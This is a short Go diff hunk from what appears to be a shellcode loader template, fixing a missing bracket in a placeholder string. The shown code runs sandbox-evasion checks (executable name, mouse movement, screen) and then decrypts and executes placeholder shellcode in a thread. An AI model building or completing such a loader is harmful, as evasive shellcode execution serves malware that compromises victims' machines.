@@ -10,7 +10,7 @@ func main() {
 	evasion.CheckNameEXE("main.exe")
 	evasion.CheckMouse(5)
 	evasion.CheckScreen()
-	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED"
+	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
 	key := "<KEY BASE64-ENCODED>"
 	shellcode.ShellCodeThreadExecute(enc_string, key)
 }
